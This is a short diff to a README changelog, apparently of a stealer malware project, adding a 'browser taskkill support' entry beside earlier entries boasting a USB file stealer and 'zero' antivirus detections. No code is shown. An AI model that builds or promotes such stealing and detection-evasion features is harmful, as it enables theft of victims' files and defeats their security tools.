@@ -88,6 +88,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.8.6 Added browser taskkill support 
 - V4.8.5 Added USB Drivers File Stealer (Still 0/59)
 - V4.8.4 0 Python (Without obfuscation) ! 0/60 detections
 - V4.8.3.5 Really fixed files uploads
